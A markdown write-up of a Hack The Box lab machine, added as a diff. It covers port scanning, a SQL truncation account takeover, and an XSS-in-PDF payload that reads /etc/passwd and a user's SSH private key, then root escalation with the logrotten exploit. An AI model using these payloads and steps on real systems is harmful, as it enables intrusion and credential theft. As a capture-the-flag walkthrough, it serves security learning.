@@ -1,0 +1,101 @@
+
+# Enum
+### NMAP
+
+As always, begin with nmap  
+
+>nmap -sC -sV -T4 -p 22,80 10.10.10.176
+>Starting Nmap 7.70 ( https://nmap.org ) at 2020-07-25 00:18 -03
+>Nmap scan report for 10.10.10.176
+>Host is up (0.19s latency).
+>
+>PORT   STATE SERVICE VERSION
+>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+>| ssh-hostkey: 
+>|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
+>|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
+>|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
+>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+>| http-cookie-flags: 
+>|   /: 
+>|     PHPSESSID: 
+>|_      httponly flag not set
+>|_http-server-header: Apache/2.4.29 (Ubuntu)
+>|_http-title: LIBRARY - Read | Learn | Have Fun
+>Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
+>
+>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+>Nmap done: 1 IP address (1 host up) scanned in 12.69 second  
+
+Opening the port 80 I got this  
+![book1](_posts/book/img/book1.png)
+
+After register I found the admin  email: admin@book.htb  
+![book2](_posts/book/img/book3.png)
+At first I didn't know what to do with this  
+Until I back to home page, look the source and find this  
+![book3](_posts/book/img/book2.png)  
+
+### SQL Truncation
+
+Using *[SQL truncation](https://resources.infosecinstitute.com/sql-truncation-attack/)* with Burp Suite I tested "name" and "email" fields with more characters  
+
+![book4](_posts/book/img/book4.png)  
+
+Logged in with the credentials admin@book.htb qwerty  
+
+![book5](_posts/book/img/book5.png)  
+
+Using *[this](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)* as reference I found a way in  
+### Exploit
+
+Loged as user again I uploaded a pdf with the fields "author" and "book title" filled with this script  
+\*Missing tags  
+
+x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();  
+
+Downloading the pdf at http://10.10.10.176/admin/collections.php?type=collections I got the /etc/passwd  
+
+![book6](_posts/book/img/book6.png)  
+
+If I was runnin to get user blood next step would be "file:///home/reader/user.txt"  
+
+Before get the id\_rsa from reader I tried root, perhaps....  
+
+Now I know that there is a user called reader, I chnged the script part "///etc/passwd" to "/home/reader/.ssh/id\_rsa and uploaded a new pdf, downloaded it again and a got the id\_rsa from user reader  
+
+Copy that to another file called id\_rsa and "chmod 600 id\_rsa"  
+
+![book7](_posts/book/img/book7.png)  
+
+Now just "ssh -i id\_rsa reader@10.10.10.176" and smile  
+
+![book8](_posts/book/img/book8.png)
+# Priv Esc
+
+After a enumerte almost everything and don't find nothing  
+
+I used [pspy](https://github.com/DominicBreuker/pspy.git) and find root process  
+scp -i id\_rsa pspy64s reader@10.10.10.176  
+
+
+pspy give me this process logrotate /usr/sbin/logrotate -f /root/log.cfg  
+
+![book9](_posts/book/img/book9.png)
+
+Search logrotate exploit in google and found [this](https://github.com/whotwagner/logrotten) on github  
+Cloned the repository and uploaded it with scp command  
+Unziped the archive and compiled the logrotten.c with gcc
+
+gcc -o logrotten logrotten.c  
+
+Created the payload  and executed logrotten
+
+![book10](_posts/book/img/book10.png)  
+
+Now just cat /tmp/id\_rsa to another file and ssh to root
+
+
+![book11](_posts/book/img/book11.png)  
+![book12](_posts/book/img/book12.png)  
+
